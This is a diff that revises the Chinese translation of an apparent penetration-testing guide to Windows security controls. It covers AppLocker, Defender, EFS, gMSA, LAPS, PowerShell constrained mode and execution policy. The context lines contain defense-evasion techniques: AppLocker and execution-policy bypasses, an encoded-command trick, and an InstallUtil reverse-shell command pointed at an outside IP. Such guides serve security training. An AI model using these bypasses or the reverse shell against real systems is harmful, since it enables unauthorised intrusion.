@@ -12,7 +12,7 @@
 ### Check
 
 检查哪些文件/扩展名被列入黑名单/白名单：
-```powershell
+```bash
 Get-ApplockerPolicy -Effective -xml
 
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
@@ -35,8 +35,8 @@ C:\windows\tracing
 ```
 - 常见的 **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可以用于绕过 AppLocker。
 - **编写不当的规则也可能被绕过**
-- 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个 **名为 `allowed` 的文件夹**，它将被允许。
-- 组织通常还专注于 **阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，但忘记了 **其他** [**PowerShell 可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
+- 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个 **名为 `allowed`** 的文件夹，它将被允许。
+- 组织通常还专注于 **阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，但忘记了 **其他** [**PowerShell 可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
 - **DLL 强制执行很少启用**，因为它可能对系统造成额外负担，以及确保没有任何东西会崩溃所需的测试量。因此，使用 **DLL 作为后门将有助于绕过 AppLocker**。
 - 您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任何进程中 **执行 Powershell** 代码并绕过 AppLocker。有关更多信息，请查看: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
@@ -56,7 +56,7 @@ LSA 将是 **检查** 提供的凭据的 **SAM** 文件（用于本地登录）�
 
 ### LSA 秘密
 
-LSA 可以在磁盘上保存一些凭据：
+LSA 可能会在磁盘上保存一些凭据：
 
 - Active Directory 的计算机帐户密码（无法访问的域控制器）。
 - Windows 服务帐户的密码
@@ -69,7 +69,7 @@ LSA 可以在磁盘上保存一些凭据：
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10 和 Windows 11 以及 Windows Server 版本中可用的防病毒软件。它 **阻止** 常见的渗透测试工具，如 **`WinPEAS`**。但是，有方法可以 **绕过这些保护**。
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10 和 Windows 11 以及 Windows Server 版本中可用的防病毒软件。它 **阻止** 常见的渗透测试工具，如 **`WinPEAS`**。然而，有方法可以 **绕过这些保护**。
 
 ### 检查
 
@@ -103,7 +103,7 @@ sc query windefend
 ```
 ## 加密文件系统 (EFS)
 
-EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的 **对称密钥**。该密钥使用用户的 **公钥** 进行加密，并存储在加密文件的 $EFS **替代数据流** 中。当需要解密时，使用用户数字证书的相应 **私钥** 从 $EFS 流中解密 FEK。更多细节可以在 [这里](https://en.wikipedia.org/wiki/Encrypting_File_System) 找到。
+EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的 **对称密钥**。该密钥使用用户的 **公钥** 进行加密，并存储在加密文件的 $EFS **备用数据流** 中。当需要解密时，使用用户数字证书的相应 **私钥** 从 $EFS 流中解密 FEK。更多细节可以在 [这里](https://en.wikipedia.org/wiki/Encrypting_File_System) 找到。
 
 **无需用户启动的解密场景** 包括：
 
@@ -121,10 +121,10 @@ EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的 **�
 
 ### 检查 EFS 信息
 
-检查 **用户** 是否 **使用** 了此 **服务**，检查此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+检查 **用户** 是否 **使用** 该 **服务**，检查此路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
 使用 cipher /c \<file\> 检查 **谁** 有 **访问** 文件的权限\
-您还可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来 **加密** 和 **解密** 所有文件
+您还可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来 **加密** 和 **解密** 所有文件。
 
 ### 解密 EFS 文件
 
@@ -132,7 +132,7 @@ EFS 通过加密保护文件，使用称为 **文件加密密钥 (FEK)** 的 **�
 
 这种方式要求 **受害者用户** 在主机内 **运行** 一个 **进程**。如果是这种情况，使用 `meterpreter` 会话可以模拟用户进程的令牌（`incognito` 中的 `impersonate_token`）。或者您可以直接 `migrate` 到用户的进程。
 
-#### 知道用户的密码
+#### 知道用户密码
 
 {{#ref}}
 https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
@@ -144,11 +144,11 @@ https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 
 - **自动密码管理**：gMSA 使用复杂的 240 字符密码，自动根据域或计算机策略进行更改。此过程由微软的密钥分发服务 (KDC) 处理，消除了手动更新密码的需要。
 - **增强安全性**：这些账户免受锁定，并且不能用于交互式登录，从而增强了安全性。
-- **多主机支持**：gMSA 可以在多个主机之间共享，使其非常适合在多个服务器上运行的服务。
+- **多主机支持**：gMSA 可以在多个主机之间共享，非常适合在多个服务器上运行的服务。
 - **计划任务能力**：与管理服务账户不同，gMSA 支持运行计划任务。
 - **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生更改时，系统会自动更新服务主体名称 (SPN)，简化 SPN 管理。
 
-gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置一次。此密码是一个加密数据块，称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只能由授权管理员和安装 gMSA 的服务器检索，从而确保安全环境。要访问此信息，需要安全连接，例如 LDAPS，或者连接必须经过“密封和安全”认证。
+gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置。此密码是一个加密数据块，称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只能由授权管理员和安装 gMSA 的服务器检索，从而确保安全环境。要访问此信息，需要使用安全连接，如 LDAPS，或连接必须经过 'Sealing & Secure' 认证。
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)
 
@@ -162,7 +162,7 @@ gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域�
 
 ## LAPS
 
-**本地管理员密码解决方案 (LAPS)**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，支持本地管理员密码的管理。这些密码是**随机生成**、唯一且**定期更改**的，集中存储在Active Directory中。对这些密码的访问通过ACL限制为授权用户。授予足够的权限后，可以读取本地管理员密码。
+**本地管理员密码解决方案 (LAPS)**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，允许管理本地管理员密码。这些密码是**随机的**、唯一的，并且**定期更改**，集中存储在Active Directory中。对这些密码的访问通过ACL限制为授权用户。授予足够的权限后，可以读取本地管理员密码。
 
 {{#ref}}
 active-directory-methodology/laps.md
@@ -170,15 +170,15 @@ active-directory-methodology/laps.md
 
 ## PS受限语言模式
 
-PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多使用PowerShell所需的功能**，例如阻止COM对象，仅允许批准的.NET类型、基于XAML的工作流、PowerShell类等。
+PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多**有效使用PowerShell所需的功能，例如阻止COM对象，仅允许批准的.NET类型、基于XAML的工作流、PowerShell类等。
 
 ### **检查**
-```powershell
+```bash
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
 ### 绕过
-```powershell
+```bash
 #Easy bypass
 Powershell -version 2
 ```
@@ -193,12 +193,12 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任何进程中 **执行 Powershell** 代码并绕过受限模式。有关更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
+您可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 来 **执行 Powershell** 代码在任何进程中并绕过受限模式。有关更多信息，请查看: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
 ## PS 执行策略
 
 默认情况下，它设置为 **restricted.** 绕过此策略的主要方法：
-```powershell
+```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
 Get-Content .runme.ps1 | PowerShell.exe -noprofile -
@@ -217,15 +217,15 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-更多信息可以在 [这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) 找到。
+更多内容可以在 [这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) 找到。
 
 ## 安全支持提供者接口 (SSPI)
 
 是用于验证用户的 API。
 
-SSPI 将负责为想要通信的两台机器找到合适的协议。首选方法是 Kerberos。然后，SSPI 将协商使用哪个身份验证协议，这些身份验证协议称为安全支持提供者 (SSP)，以 DLL 形式位于每台 Windows 机器内部，且两台机器必须支持相同的协议才能进行通信。
+SSPI 将负责为想要通信的两台机器找到合适的协议。首选方法是 Kerberos。然后，SSPI 将协商将使用的身份验证协议，这些身份验证协议称为安全支持提供者 (SSP)，以 DLL 的形式位于每台 Windows 机器内部，并且两台机器必须支持相同的协议才能进行通信。
 
-### 主要 SSPs
+### 主要 SSP
 
 - **Kerberos**: 首选
 - %windir%\Windows\System32\kerberos.dll
@@ -238,7 +238,7 @@ SSPI 将负责为想要通信的两台机器找到合适的协议。首选方法
 - **Negotiate**: 用于协商使用的协议（Kerberos 或 NTLM，默认是 Kerberos）
 - %windir%\Windows\System32\lsasrv.dll
 
-#### 协商可能提供多种方法或仅提供一种。
+#### 协商可以提供多种方法或仅提供一种。
 
 ## UAC - 用户帐户控制
 
